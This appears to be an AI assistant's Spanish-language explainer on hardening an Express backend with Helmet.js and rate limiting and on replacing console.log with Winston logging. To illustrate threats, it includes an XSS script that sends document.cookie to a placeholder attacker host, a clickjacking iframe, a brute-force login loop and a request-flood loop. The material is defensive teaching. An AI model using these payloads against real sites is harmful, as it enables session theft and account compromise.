# 🔒 Explicación Detallada: Seguridad y Logging

Este documento explica en detalle los dos primeros puntos críticos de mejora antes del deploy.

---

## 1. 🔒 Seguridad de Producción: Helmet.js y Rate Limiting

### ¿Por qué es importante?

Cuando tu aplicación está en producción en Azure, está expuesta a internet. Sin las protecciones adecuadas, puede ser vulnerable a:

- **Ataques de fuerza bruta** (intentos de login masivos)
- **Ataques DDoS** (sobrecarga del servidor)
- **Vulnerabilidades de headers HTTP** (XSS, clickjacking, etc.)
- **Exposición de información sensible** en headers

### ¿Qué hace cada herramienta?

---

### 🛡️ **Helmet.js** - Headers de Seguridad HTTP

**¿Qué es?**
Helmet.js es un middleware que configura automáticamente headers HTTP de seguridad para proteger tu aplicación.

**¿Qué problemas resuelve?**

#### **Problema 1: XSS (Cross-Site Scripting)**
Sin Helmet, un atacante podría inyectar JavaScript malicioso en tu aplicación.

**Ejemplo de ataque:**
```javascript
// Un atacante podría intentar inyectar esto en un formulario:
<script>
  // Robar cookies de sesión
  fetch('https://atacante.com/robar?cookie=' + document.cookie);
</script>
```

**Con Helmet:**
```typescript
// Helmet configura automáticamente:
Content-Security-Policy: default-src 'self'
// Esto bloquea scripts externos y protege contra XSS
```

#### **Problema 2: Clickjacking**
Un atacante podría incrustar tu aplicación en un iframe y hacer que los usuarios hagan clic en botones sin saberlo.

**Ejemplo:**
```html
<!-- Sitio malicioso -->
<iframe src="https://tu-app.com/login" style="opacity:0"></iframe>
<button style="position:absolute; top:100px; left:100px">
  Haz clic aquí para ganar $1000
</button>
<!-- El usuario cree que hace clic en el botón, pero en realidad hace clic en tu login -->
```

**Con Helmet:**
```typescript
// Helmet configura:
X-Frame-Options: DENY
// Esto previene que tu app sea incrustada en iframes
```

#### **Problema 3: Exposición de información**
Sin Helmet, los headers HTTP pueden revelar información sobre tu servidor.

**Sin Helmet:**
```
Server: Express/4.21.2
X-Powered-By: Express
```

**Con Helmet:**
```
Server: (oculto)
X-Powered-By: (removido)
```

---

### 🚦 **Rate Limiting** - Control de Velocidad de Requests

**¿Qué es?**
Rate limiting limita la cantidad de requests que un cliente puede hacer en un período de tiempo.

**¿Qué problemas resuelve?**

#### **Problema 1: Ataques de Fuerza Bruta**
Un atacante intenta adivinar contraseñas haciendo miles de requests.

**Ejemplo de ataque:**
```javascript
// Script de atacante
for (let i = 0; i < 10000; i++) {
  fetch('https://tu-app.com/api/auth/web/login', {
    method: 'POST',
    body: JSON.stringify({
      username: 'admin',
      password: `password${i}`
    })
  });
}
// 10,000 intentos de login en segundos
```

**Sin Rate Limiting:**
- ✅ Tu servidor procesa todos los requests
- ❌ Sobrecarga el servidor
- ❌ Consume recursos de BD
- ❌ Puede hacer que usuarios legítimos no puedan acceder

**Con Rate Limiting:**
```typescript
// Máximo 5 intentos de login por IP cada 15 minutos
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutos
  max: 5, // máximo 5 intentos
});

app.use('/api/auth', authLimiter);
```

**Resultado:**
- ✅ Después de 5 intentos, el atacante recibe: `429 Too Many Requests`
- ✅ Debe esperar 15 minutos para intentar de nuevo
- ✅ Tu servidor está protegido

#### **Problema 2: DDoS (Denial of Service)**
Un atacante envía miles de requests para sobrecargar tu servidor.

**Ejemplo:**
```javascript
// Ataque DDoS simple
setInterval(() => {
  fetch('https://tu-app.com/api/estadisticas');
}, 10); // 100 requests por segundo
```

**Con Rate Limiting Global:**
```typescript
// Máximo 100 requests por IP cada 15 minutos
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
});

app.use('/api/', limiter);
```

**Resultado:**
- ✅ Después de 100 requests, el cliente recibe: `429 Too Many Requests`
- ✅ El servidor no se sobrecarga
- ✅ Usuarios legítimos pueden seguir usando la app normalmente

---

### 📊 **Comparación Visual**

#### **Sin Protecciones:**
```
Cliente → [Sin Rate Limit] → Servidor → [Sin Helmet] → Internet
         ↑ Puede hacer        ↑ Sobrecargado        ↑ Headers inseguros
           requests ilimitados
```

#### **Con Protecciones:**
```
Cliente → [Rate Limit] → [Helmet] → Servidor → Internet
         ↑ Máx 100 req  ↑ Headers  ↑ Protegido ↑ Headers seguros
                         seguros
```

---

### 💻 **Implementación Práctica**

#### **Paso 1: Instalar**
```bash
cd backend
npm install helmet express-rate-limit
npm install --save-dev @types/express-rate-limit
```

#### **Paso 2: Configurar en `server.ts`**

```typescript
import express from 'express';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';

const app = express();

// ===== HELMET - Headers de Seguridad =====
app.use(helmet({
  // Política de contenido (previene XSS)
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"], // Solo permitir recursos del mismo origen
      styleSrc: ["'self'", "'unsafe-inline'"], // CSS inline permitido
      scriptSrc: ["'self'"], // Solo scripts del mismo origen
      imgSrc: ["'self'", "data:", "https:"], // Imágenes del mismo origen, data URLs, y HTTPS
    },
  },
  // Prevenir clickjacking
  frameguard: { action: 'deny' },
  // Ocultar información del servidor
  hidePoweredBy: true,
}));

// ===== RATE LIMITING GLOBAL =====
// Aplicar a todas las rutas /api/*
const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutos
  max: 100, // máximo 100 requests por IP
  message: {
    error: 'Demasiadas solicitudes. Intenta de nuevo en 15 minutos.',
  },
  standardHeaders: true, // Incluir headers estándar (X-RateLimit-*)
  legacyHeaders: false, // No incluir headers legacy (Retry-After)
});

app.use('/api/', globalLimiter);

// ===== RATE LIMITING PARA AUTENTICACIÓN =====
// Más estricto para endpoints de login
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutos
  max: 5, // máximo 5 intentos de login
  message: {
    error: 'Demasiados intentos de login. Intenta de nuevo en 15 minutos.',
  },
  skipSuccessfulRequests: true, // No contar requests exitosos
});

// Aplicar después de definir las rutas de auth
// app.use('/api/auth', authLimiter);
// app.use('/api/auth/web', authLimiter);
```

#### **Paso 3: Verificar que funciona**

**Test 1: Verificar headers de seguridad**
```bash
curl -I https://tu-app.azurewebsites.net/api/health
```

**Deberías ver:**
```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-DNS-Prefetch-Control: off
Content-Security-Policy: default-src 'self'
```

**Test 2: Verificar rate limiting**
```bash
# Hacer 101 requests rápidamente
for i in {1..101}; do
  curl https://tu-app.azurewebsites.net/api/health
done
```

**Resultado esperado:**
- Requests 1-100: ✅ `200 OK`
- Request 101: ❌ `429 Too Many Requests`

---

## 2. 📝 Logging Estructurado: Winston

### ¿Por qué es importante?

Actualmente tienes **274 instancias de `console.log`** en el código. Esto funciona en desarrollo, pero en producción tiene problemas:

#### **Problema 1: No hay niveles de log**
```typescript
// ❌ Actual
console.log('✅ Usuario logueado');
console.log('❌ Error en BD');
console.log('📊 Estadísticas cargadas');

// ¿Cuál es más importante? ¿Cuál es un error crítico?
// No hay forma de filtrar o priorizar
```

#### **Problema 2: No hay persistencia**
```typescript
// ❌ Actual
console.log('Error:', error);

// En Azure, estos logs se pierden cuando:
// - El servidor se reinicia
// - El contenedor se recicla
// - Necesitas revisar logs de hace 3 días
```

#### **Problema 3: No hay estructura**
```typescript
// ❌ Actual
console.log('Error:', error);
console.log('Usuario:', user);
console.log('Request:', req);

// Dificulta:
// - Buscar logs específicos
// - Analizar patrones
// - Integrar con herramientas de monitoreo
```

#### **Problema 4: Performance**
```typescript
// ❌ Actual
console.log('Procesando imagen:', imageName, 'Usuario:', userId, 'Tiempo:', Date.now());

// En producción, console.log es síncrono y puede:
// - Ralentizar la aplicación
// - Bloquear el event loop
// - Consumir recursos innecesariamente
```

---

### ✅ **Solución: Winston Logger**

Winston es un logger profesional que resuelve todos estos problemas.

#### **Ventajas de Winston:**

1. **Niveles de log** (error, warn, info, debug)
2. **Persistencia** (guarda logs en archivos)
3. **Estructura** (formato JSON estructurado)
4. **Performance** (asíncrono, no bloquea)
5. **Rotación** (archivos nuevos cada día, elimina logs viejos)

---

### 📊 **Comparación Visual**

#### **Sin Winston (console.log):**
```
Error → console.log → Consola → ❌ Se pierde al reiniciar
                              ❌ No hay niveles
                              ❌ No hay estructura
                              ❌ Dificulta búsqueda
```

#### **Con Winston:**
```
Error → logger.error() → Archivo JSON → ✅ Persistente
                        → Azure Logs → ✅ Integrado
                        → Niveles → ✅ Filtrable
                        → Estructurado → ✅ Buscable
```

---

### 💻 **Implementación Práctica**

#### **Paso 1: Instalar**
```bash
cd backend
npm install winston winston-daily-rotate-file
```

#### **Paso 2: Crear `backend/src/lib/logger.ts`**

```typescript
import winston from 'winston';
import DailyRotateFile from 'winston-daily-rotate-file';
import path from 'path';

// Directorio para logs
const logDir = path.join(process.cwd(), 'logs');

// Formato de log estructurado (JSON)
const logFormat = winston.format.combine(
  winston.format.timestamp({ format: 'YYYY-MM-DD HH:mm:ss' }),
  winston.format.errors({ stack: true }), // Incluir stack traces
  winston.format.splat(), // Interpolación de strings
  winston.format.json() // Formato JSON
);

// Transporte: Archivo de aplicación (rotación diaria)
const fileRotateTransport = new DailyRotateFile({
  filename: path.join(logDir, 'application-%DATE%.log'),
  datePattern: 'YYYY-MM-DD',
  maxSize: '20m', // Máximo 20MB por archivo
  maxFiles: '14d', // Mantener logs por 14 días
  format: logFormat,
});

// Transporte: Archivo de errores (solo errores)
const errorFileRotateTransport = new DailyRotateFile({
  filename: path.join(logDir, 'error-%DATE%.log'),
  datePattern: 'YYYY-MM-DD',
  level: 'error', // Solo errores
  maxSize: '20m',
  maxFiles: '30d', // Mantener errores por 30 días
  format: logFormat,
});

// Transporte: Consola (solo en desarrollo)
const consoleTransport = new winston.transports.Console({
  format: winston.format.combine(
    winston.format.colorize(), // Colores en consola
    winston.format.simple(),
    winston.format.printf(({ timestamp, level, message, ...meta }) => {
      return `${timestamp} [${level}]: ${message} ${
        Object.keys(meta).length ? JSON.stringify(meta, null, 2) : ''
      }`;
    })
  ),
});

// Crear logger
const logger = winston.createLogger({
  level: process.env.LOG_LEVEL || (process.env.NODE_ENV === 'production' ? 'info' : 'debug'),
  format: logFormat,
  defaultMeta: { service: 'luzsombra-backend' },
  transports: [
    fileRotateTransport, // Todos los logs
    errorFileRotateTransport, // Solo errores
    // Solo mostrar en consola en desarrollo
    ...(process.env.NODE_ENV !== 'production' ? [consoleTransport] : []),
  ],
  // Manejar excepciones no capturadas
  exceptionHandlers: [
    new winston.transports.File({ filename: path.join(logDir, 'exceptions.log') }),
  ],
  // Manejar promesas rechazadas
  rejectionHandlers: [
    new winston.transports.File({ filename: path.join(logDir, 'exceptions.log') }),
  ],
});

export default logger;
```

#### **Paso 3: Reemplazar console.log**

**Antes:**
```typescript
// ❌ backend/src/lib/db.ts
export async function getConnection() {
  try {
    pool = await sql.connect(config);
    console.log(`✅ [DB] Conectado a SQL Server: ${config.server}/${config.database}`);
    return pool;
  } catch (error: any) {
    console.error(`❌ [DB] Error conectando a SQL Server:`, error.message || error);
    throw error;
  }
}
```

**Después:**
```typescript
// ✅ backend/src/lib/db.ts
import logger from './logger';

export async function getConnection() {
  try {
    pool = await sql.connect(config);
    logger.info('Conexión a SQL Server establecida', {
      server: config.server,
      database: config.database,
      timestamp: new Date().toISOString(),
    });
    return pool;
  } catch (error: any) {
    logger.error('Error conectando a SQL Server', {
      error: error.message,
      code: error.code,
      server: config.server,
      database: config.database,
      stack: error.stack,
    });
    throw error;
  }
}
```

---

### 📋 **Niveles de Log y Cuándo Usarlos**

```typescript
import logger from './lib/logger';

// ERROR: Errores críticos que requieren atención inmediata
logger.error('Error crítico en base de datos', {
  error: error.message,
  userId: user.id,
  action: 'saveProcessingResult',
});

// WARN: Advertencias que no son críticas pero deben revisarse
logger.warn('Rate limit casi alcanzado', {
  ip: req.ip,
  requests: 95,
  limit: 100,
});

// INFO: Información importante del flujo de la aplicación
logger.info('Usuario autenticado exitosamente', {
  userId: user.id,
  username: user.username,
  ip: req.ip,
});

// DEBUG: Información detallada para debugging (solo en desarrollo)
logger.debug('Procesando imagen', {
  filename: image.name,
  size: image.size,
  mimeType: image.mimetype,
});
```

---

### 📁 **Estructura de Archivos de Log**

Después de implementar Winston, tendrás:

```
backend/
  logs/
    application-2025-01-15.log    # Todos los logs del día
    application-2025-01-14.log    # Logs del día anterior
    error-2025-01-15.log           # Solo errores del día
    error-2025-01-14.log           # Errores del día anterior
    exceptions.log                 # Excepciones no capturadas
```

**Ejemplo de contenido de `application-2025-01-15.log`:**
```json
{
  "timestamp": "2025-01-15 10:30:45",
  "level": "info",
  "message": "Conexión a SQL Server establecida",
  "server": "[TU_SERVIDOR_SQL]",
  "database": "[TU_BASE_DE_DATOS]",
  "service": "luzsombra-backend"
}
{
  "timestamp": "2025-01-15 10:31:12",
  "level": "error",
  "message": "Error procesando imagen",
  "error": "UNIQUE KEY constraint violation",
  "filename": "E07_92_H184_P25.jpg",
  "stack": "Error: ...",
  "service": "luzsombra-backend"
}
```

---

### 🔍 **Búsqueda y Análisis de Logs**

Con logs estructurados, puedes:

**Buscar todos los errores:**
```bash
grep '"level":"error"' logs/application-*.log
```

**Buscar errores de un usuario específico:**
```bash
grep '"userId":123' logs/error-*.log
```

**Contar errores por día:**
```bash
grep -c '"level":"error"' logs/error-2025-01-15.log
```

**Integrar con Azure Application Insights:**
Los logs JSON estructurados se integran fácilmente con herramientas de monitoreo.

---

### ⚙️ **Configuración por Ambiente**

```typescript
// Desarrollo: Muestra todo en consola
LOG_LEVEL=debug

// Producción: Solo info, warn, error (no debug)
LOG_LEVEL=info

// Testing: Solo errores
LOG_LEVEL=error
```

---

### 📊 **Comparación Final**

| Aspecto | console.log | Winston |
|---------|-------------|---------|
| **Niveles** | ❌ No | ✅ Sí (error, warn, info, debug) |
| **Persistencia** | ❌ Se pierde | ✅ Archivos rotados |
| **Estructura** | ❌ Texto plano | ✅ JSON estructurado |
| **Performance** | ⚠️ Síncrono | ✅ Asíncrono |
| **Búsqueda** | ❌ Difícil | ✅ Fácil (grep, herramientas) |
| **Integración** | ❌ No | ✅ Azure, Application Insights |
| **Rotación** | ❌ No | ✅ Automática diaria |
| **Filtrado** | ❌ No | ✅ Por nivel, fecha, etc. |

---

## 🎯 Resumen

### **Seguridad (Helmet + Rate Limiting):**
- ✅ Protege contra ataques comunes
- ✅ Previene sobrecarga del servidor
- ✅ Headers HTTP seguros
- ✅ Implementación: ~30 líneas de código

### **Logging (Winston):**
- ✅ Logs persistentes y estructurados
- ✅ Niveles de log para priorización
- ✅ Rotación automática de archivos
- ✅ Integración con herramientas de monitoreo
- ✅ Implementación: 1 archivo de configuración

**Tiempo estimado de implementación:** 2-3 horas  
**Impacto:** 🔴 **CRÍTICO** - Mejora significativamente la seguridad y observabilidad

---

¿Quieres que implemente estos cambios ahora en tu código?

